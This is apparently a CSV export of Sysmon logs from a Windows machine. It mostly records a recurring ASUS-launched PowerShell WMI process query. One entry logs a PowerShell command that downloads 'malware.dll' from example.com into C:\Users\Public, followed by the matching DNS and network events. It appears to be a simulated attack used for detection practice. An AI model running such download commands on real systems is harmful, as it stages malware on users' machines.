"TimeCreated","EventID","Message"
"20/07/2025 22:08:33","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:08:33.217
ProcessGuid: {7f6f9216-5ad1-687d-f108-000000006901}
ProcessId: 27140
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:08:03","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:08:03.288
ProcessGuid: {7f6f9216-5ab3-687d-ee08-000000006901}
ProcessId: 436
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_wxozi1hq.ye0.ps1
CreationUtcTime: 2025-07-20 21:08:03.288
User: SHARON\Shxro"
"20/07/2025 22:08:03","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:08:03.214
ProcessGuid: {7f6f9216-5ab3-687d-ee08-000000006901}
ProcessId: 436
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:07:33","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:07:33.276
ProcessGuid: {7f6f9216-5a95-687d-ec08-000000006901}
ProcessId: 7860
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_qvyneh1k.wga.ps1
CreationUtcTime: 2025-07-20 21:07:33.276
User: SHARON\Shxro"
"20/07/2025 22:07:33","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:07:33.202
ProcessGuid: {7f6f9216-5a95-687d-ec08-000000006901}
ProcessId: 7860
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:07:03","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:07:03.263
ProcessGuid: {7f6f9216-5a77-687d-e808-000000006901}
ProcessId: 25496
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_kcdpasna.ovq.ps1
CreationUtcTime: 2025-07-20 21:07:03.263
User: SHARON\Shxro"
"20/07/2025 22:07:03","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:07:03.191
ProcessGuid: {7f6f9216-5a77-687d-e808-000000006901}
ProcessId: 25496
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:06:33","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:06:33.272
ProcessGuid: {7f6f9216-5a59-687d-e408-000000006901}
ProcessId: 19832
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_gjmabnld.giu.ps1
CreationUtcTime: 2025-07-20 21:06:33.272
User: SHARON\Shxro"
"20/07/2025 22:06:33","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:06:33.189
ProcessGuid: {7f6f9216-5a59-687d-e408-000000006901}
ProcessId: 19832
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:06:03","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:06:03.254
ProcessGuid: {7f6f9216-5a3b-687d-e208-000000006901}
ProcessId: 26484
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_3c220dq2.frm.ps1
CreationUtcTime: 2025-07-20 21:06:03.254
User: SHARON\Shxro"
"20/07/2025 22:06:03","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:06:03.181
ProcessGuid: {7f6f9216-5a3b-687d-e208-000000006901}
ProcessId: 26484
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:05:33","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:05:33.250
ProcessGuid: {7f6f9216-5a1d-687d-dd08-000000006901}
ProcessId: 12452
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_mfv1heyd.ses.ps1
CreationUtcTime: 2025-07-20 21:05:33.250
User: SHARON\Shxro"
"20/07/2025 22:05:33","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:05:33.175
ProcessGuid: {7f6f9216-5a1d-687d-dd08-000000006901}
ProcessId: 12452
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:05:21","22","Dns query:
RuleName: -
UtcTime: 2025-07-20 21:05:19.226
ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
ProcessId: 12256
QueryName: example.com
QueryStatus: 0
QueryResults: ::ffff:23.192.228.84;::ffff:23.215.0.136;::ffff:23.215.0.138;::ffff:96.7.128.175;::ffff:96.7.128.198;::ffff:23.192.228.80;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SHARON\Shxro"
"20/07/2025 22:05:20","3","Network connection detected:
RuleName: -
UtcTime: 2025-07-20 21:05:19.504
ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
ProcessId: 12256
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SHARON\Shxro
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.1.128
SourceHostname: Sharon.lan
SourcePort: 52871
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 23.192.228.84
DestinationHostname: a23-192-228-84.deploy.static.akamaitechnologies.com
DestinationPort: 80
DestinationPortName: http"
"20/07/2025 22:05:03","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:05:03.236
ProcessGuid: {7f6f9216-59ff-687d-d908-000000006901}
ProcessId: 11424
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_sdnav3tr.yyh.ps1
CreationUtcTime: 2025-07-20 21:05:03.236
User: SHARON\Shxro"
"20/07/2025 22:05:03","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:05:03.160
ProcessGuid: {7f6f9216-59ff-687d-d908-000000006901}
ProcessId: 11424
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:04:33","3","Network connection detected:
RuleName: -
UtcTime: 2025-07-20 21:04:31.084
ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
ProcessId: 15056
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SHARON\Shxro
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.1.128
SourceHostname: Sharon.lan
SourcePort: 52867
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 23.192.228.84
DestinationHostname: -
DestinationPort: 80
DestinationPortName: http"
"20/07/2025 22:04:33","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:04:33.221
ProcessGuid: {7f6f9216-59e1-687d-d308-000000006901}
ProcessId: 27340
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_lx2vn1te.evd.ps1
CreationUtcTime: 2025-07-20 21:04:33.221
User: SHARON\Shxro"
"20/07/2025 22:04:33","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:04:33.147
ProcessGuid: {7f6f9216-59e1-687d-d308-000000006901}
ProcessId: 27340
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:04:32","22","Dns query:
RuleName: -
UtcTime: 2025-07-20 21:04:30.931
ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
ProcessId: 15056
QueryName: example.com
QueryStatus: 0
QueryResults: ::ffff:23.192.228.84;::ffff:23.215.0.136;::ffff:23.215.0.138;::ffff:96.7.128.175;::ffff:96.7.128.198;::ffff:23.192.228.80;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: SHARON\Shxro"
"20/07/2025 22:04:30","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:04:30.787
ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
ProcessId: 15056
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_wqom1tfi.gtp.ps1
CreationUtcTime: 2025-07-20 21:04:30.787
User: SHARON\Shxro"
"20/07/2025 22:04:30","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:04:30.728
ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
ProcessId: 15056
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Invoke-WebRequest -Uri http://example.com/malware.dll -OutFile C:\Users\Public\malware.dll""
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
ParentProcessId: 12256
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SHARON\Shxro"
"20/07/2025 22:04:12","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:04:12.266
ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
ProcessId: 12256
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_heygfjnk.afu.ps1
CreationUtcTime: 2025-07-20 21:04:12.266
User: SHARON\Shxro"
"20/07/2025 22:04:12","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:04:12.068
ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
ProcessId: 12256
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {7f6f9216-39ca-687d-1101-000000006901}
ParentProcessId: 12968
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\WINDOWS\Explorer.EXE
ParentUser: SHARON\Shxro"
"20/07/2025 22:04:03","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:04:03.221
ProcessGuid: {7f6f9216-59c3-687d-ca08-000000006901}
ProcessId: 23748
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_u3qrgj3c.2u1.ps1
CreationUtcTime: 2025-07-20 21:04:03.220
User: SHARON\Shxro"
"20/07/2025 22:04:03","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:04:03.147
ProcessGuid: {7f6f9216-59c3-687d-ca08-000000006901}
ProcessId: 23748
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
"20/07/2025 22:03:33","11","File created:
RuleName: -
UtcTime: 2025-07-20 21:03:33.213
ProcessGuid: {7f6f9216-59a5-687d-c808-000000006901}
ProcessId: 24276
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_4dp0fe3k.5hg.ps1
CreationUtcTime: 2025-07-20 21:03:33.213
User: SHARON\Shxro"
"20/07/2025 22:03:33","1","Process Create:
RuleName: -
UtcTime: 2025-07-20 21:03:33.140
ProcessGuid: {7f6f9216-59a5-687d-c808-000000006901}
ProcessId: 24276
Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
CurrentDirectory: C:\WINDOWS\system32\
User: SHARON\Shxro
LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
LogonId: 0x77C7B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
ParentProcessId: 18904
ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
ParentUser: SHARON\Shxro"
